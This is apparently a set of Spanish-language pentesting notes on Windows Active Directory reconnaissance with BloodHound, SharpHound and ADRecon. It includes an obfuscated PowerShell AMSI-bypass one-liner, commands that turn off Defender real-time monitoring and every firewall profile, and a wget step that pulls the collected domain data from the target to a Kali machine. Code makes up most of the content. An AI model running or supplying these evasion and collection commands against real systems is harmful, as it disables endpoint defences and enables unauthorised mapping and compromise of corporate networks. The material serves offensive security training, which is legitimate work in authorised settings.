# Reconocimiento en Windows

## Requisitos: Instalar y levantar BloodHound en Kali

Instalar siguiendo este enlace
[1]: https://www.youtube.com/watch?v=gra9rU1-qY8

Inicializar los servicios
```
sudo neo4j console
http://127.0.0.1:7474/browser/
sudo bloodhound
```

## En Powershell

Desactivar AMSI, para evitar que Windows Defender te bloquee

```
powershell -ep bypass

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

Set-MpPreference -DisableRealTimeMonitoring $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

Gathering con ADRecon
```
. .\AdRecon.ps1
```
![image](https://user-images.githubusercontent.com/50930193/126189223-8ac244af-1625-4499-bd10-b70e9c65f0b7.png)


Gathering con SharpHound y BloodHound
```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
```
![image](https://user-images.githubusercontent.com/50930193/126214533-932a5fed-cb9d-42c8-97de-7a9bc403182c.png)

Abrir un listener en DOS para copiar la información desde Kali
![image](https://user-images.githubusercontent.com/50930193/126214344-8fb1b36e-40d0-45df-a771-6afe71bd84b2.png)

Descargar desde Kali el archivo generado
```
wget http://192.168.153.200:8000/20210719121509_BloodHound.zip
```

Desde bloodhound importar la información descargando 
![image](https://user-images.githubusercontent.com/50930193/126216343-55dda0e8-80aa-4216-831f-dab71ce3df9e.png)

![image](https://user-images.githubusercontent.com/50930193/126216805-0de9df1e-c6e2-4c3e-978d-43f2d531018d.png)

Analizar información diversa

![image](https://user-images.githubusercontent.com/50930193/126218788-6e27ca99-060d-481c-9da8-14e41fd17763.png)

![image](https://user-images.githubusercontent.com/50930193/126218962-bc290f3d-e561-4c31-bd24-4f76289f27b1.png)

![image](https://user-images.githubusercontent.com/50930193/126219304-293b176d-53d9-4600-be8c-20d37838e07f.png)




